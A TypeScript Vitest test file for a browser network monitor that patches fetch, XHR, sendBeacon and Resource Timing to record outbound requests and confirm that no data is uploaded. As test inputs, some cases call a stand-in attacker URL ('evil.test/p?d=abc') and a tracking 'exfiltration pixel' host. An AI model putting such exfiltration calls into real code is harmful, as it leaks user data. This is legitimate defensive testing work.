import { describe, expect, it, vi } from 'vitest';
import { bodySize, mergeAudits, startNetworkProof, type ProofScope } from './networkProof';

/** A fake global with just the APIs the monitor patches. */
function makeScope() {
  const fetchSpy = vi.fn(async () => ({ ok: true }));
  const openSpy = vi.fn();
  const sendSpy = vi.fn();
  const beaconSpy = vi.fn(() => true);
  class FakeXHR {
    open(...a: unknown[]) {
      return openSpy(...a);
    }
    send(...a: unknown[]) {
      return sendSpy(...a);
    }
  }
  const observers: Array<{ cb: (l: { getEntries(): unknown[] }) => void; queue: unknown[] }> = [];
  class FakePO {
    private rec: { cb: (l: { getEntries(): unknown[] }) => void; queue: unknown[] };
    constructor(cb: (l: { getEntries(): unknown[] }) => void) {
      this.rec = { cb, queue: [] };
      observers.push(this.rec);
    }
    observe() {}
    takeRecords() {
      const q = this.rec.queue;
      this.rec.queue = [];
      return q;
    }
    disconnect() {}
  }
  const scope = {
    fetch: fetchSpy,
    XMLHttpRequest: FakeXHR,
    navigator: { sendBeacon: beaconSpy },
    PerformanceObserver: FakePO,
    location: { href: 'https://app.test/page', origin: 'https://app.test' },
    TextEncoder,
    FormData,
    URLSearchParams,
    Request: globalThis.Request,
  } as unknown as ProofScope & Record<string, unknown>;
  const emitResource = (name: string, initiatorType = 'img') =>
    observers.forEach((o) => o.cb({ getEntries: () => [{ name, entryType: 'resource', initiatorType }] }));
  return { scope, fetchSpy, openSpy, sendSpy, beaconSpy, FakeXHR, emitResource };
}

describe('bodySize', () => {
  it('measures strings in UTF-8 bytes, blobs, buffers, form data', () => {
    expect(bodySize(undefined)).toBe(0);
    expect(bodySize('abc')).toBe(3);
    expect(bodySize('€')).toBe(3);
    expect(bodySize(new Blob(['12345']))).toBe(5);
    expect(bodySize(new Uint8Array(7))).toBe(7);
    expect(bodySize(new URLSearchParams({ a: '1' }))).toBe(3);
    const fd = new FormData();
    fd.append('k', 'vv');
    expect(bodySize(fd)).toBe(3);
  });
  it('returns null for something it cannot measure', () => {
    expect(bodySize(new ReadableStream())).toBeNull();
  });
});

describe('startNetworkProof', () => {
  it('records a GET and reports zero upload', async () => {
    const t = makeScope();
    const original = t.scope.fetch;
    const proof = startNetworkProof({ scope: t.scope });
    await t.scope.fetch!('/ocr/worker.min.js');
    const audit = proof.stop();
    expect(audit.requests).toEqual([{ url: 'https://app.test/ocr/worker.min.js', method: 'GET', size: 0 }]);
    expect(audit.totalOutboundBytes).toBe(0);
    expect(audit.verifiedZeroUpload).toBe(true);
    expect(t.fetchSpy).toHaveBeenCalledTimes(1);
    expect(t.scope.fetch).toBe(original); // restored
  });

  it('counts the bytes of a POST and refuses to verify zero upload', async () => {
    const t = makeScope();
    const proof = startNetworkProof({ scope: t.scope });
    await t.scope.fetch!('/api/x', { method: 'post', body: 'hello world' });
    const audit = proof.stop();
    expect(audit.requests[0]).toMatchObject({ method: 'POST', size: 11 });
    expect(audit.totalOutboundBytes).toBe(11);
    expect(audit.verifiedZeroUpload).toBe(false);
  });

  it('measures a body carried by a Request object', async () => {
    const t = makeScope();
    const proof = startNetworkProof({ scope: t.scope });
    await t.scope.fetch!(new Request('https://app.test/up', { method: 'POST', body: 'abcd' }));
    await new Promise((r) => setTimeout(r, 0));
    const audit = proof.stop();
    expect(audit.totalOutboundBytes).toBe(4);
    expect(audit.verifiedZeroUpload).toBe(false);
  });

  it('treats a cross-origin GET as not zero-upload (the URL can carry data)', async () => {
    const t = makeScope();
    const proof = startNetworkProof({ scope: t.scope });
    await t.scope.fetch!('https://evil.test/p?d=abc');
    expect(proof.stop().verifiedZeroUpload).toBe(false);
  });

  it('records XMLHttpRequest with its body size', () => {
    const t = makeScope();
    const proof = startNetworkProof({ scope: t.scope });
    const x = new t.FakeXHR();
    x.open('PUT', '/save');
    x.send('12345678');
    const audit = proof.stop();
    expect(audit.requests).toEqual([{ url: 'https://app.test/save', method: 'PUT', size: 8 }]);
    expect(audit.verifiedZeroUpload).toBe(false);
    expect(t.sendSpy).toHaveBeenCalledWith('12345678');
  });

  it('records sendBeacon and never calls it through when offline', () => {
    const t = makeScope();
    const proof = startNetworkProof({ scope: t.scope, offline: true });
    expect(t.scope.navigator!.sendBeacon!('/b', 'xyz')).toBe(false);
    const audit = proof.stop();
    expect(t.beaconSpy).not.toHaveBeenCalled();
    expect(audit.requests[0]).toMatchObject({ method: 'POST', size: 3 });
    expect(audit.verifiedZeroUpload).toBe(false);
  });

  it('offline mode rejects fetch and XHR but still records the attempt', async () => {
    const t = makeScope();
    const proof = startNetworkProof({ scope: t.scope, offline: true });
    await expect(t.scope.fetch!('/ocr/eng.traineddata.gz')).rejects.toThrow(/offline mode/);
    const x = new t.FakeXHR();
    x.open('GET', '/a');
    expect(() => x.send()).toThrow(/offline mode/);
    const audit = proof.stop();
    expect(t.fetchSpy).not.toHaveBeenCalled();
    expect(t.sendSpy).not.toHaveBeenCalled();
    expect(audit.requests).toHaveLength(2);
  });

  it('sees requests that only Resource Timing can see, and ignores ones already recorded', async () => {
    const t = makeScope();
    const proof = startNetworkProof({ scope: t.scope });
    await t.scope.fetch!('/a');
    t.emitResource('https://app.test/a', 'fetch'); // duplicate of the patched fetch
    t.emitResource('https://tracker.test/pixel.gif', 'img'); // an exfiltration pixel
    t.emitResource('blob:https://app.test/123', 'img'); // local
    const audit = proof.stop();
    expect(audit.requests.map((r) => r.url)).toEqual(['https://app.test/a', 'https://tracker.test/pixel.gif']);
    expect(audit.verifiedZeroUpload).toBe(false);
  });

  it('is reactive: subscribers are notified and the snapshot changes only on change', async () => {
    const t = makeScope();
    const proof = startNetworkProof({ scope: t.scope });
    const first = proof.getAudit();
    expect(proof.getAudit()).toBe(first);
    const listener = vi.fn();
    const off = proof.subscribe(listener);
    await t.scope.fetch!('/x');
    expect(listener).toHaveBeenCalled();
    expect(proof.getAudit()).not.toBe(first);
    off();
    proof.stop();
  });

  it('stops recording after stop() and stop() twice is safe', async () => {
    const t = makeScope();
    const proof = startNetworkProof({ scope: t.scope });
    proof.stop();
    proof.stop();
    await t.scope.fetch!('/late');
    expect(proof.getAudit().requests).toHaveLength(0);
  });

  it('restores correctly when sessions are nested', async () => {
    const t = makeScope();
    const base = t.scope.fetch;
    const outer = startNetworkProof({ scope: t.scope });
    const inner = startNetworkProof({ scope: t.scope });
    await t.scope.fetch!('/n');
    expect(inner.stop().requests).toHaveLength(1);
    expect(outer.stop().requests).toHaveLength(1);
    expect(t.scope.fetch).toBe(base);
  });
});

describe('mergeAudits', () => {
  it('adds bytes and requests, and requires every audit to be clean', () => {
    const clean = { totalOutboundBytes: 0, requests: [{ url: 'u', method: 'GET', size: 0 }], verifiedZeroUpload: true };
    const dirty = { totalOutboundBytes: 5, requests: [{ url: 'v', method: 'POST', size: 5 }], verifiedZeroUpload: false };
    expect(mergeAudits(clean, undefined, dirty)).toEqual({
      totalOutboundBytes: 5,
      requests: [...clean.requests, ...dirty.requests],
      verifiedZeroUpload: false,
    });
    expect(mergeAudits(clean, clean).verifiedZeroUpload).toBe(true);
  });
});
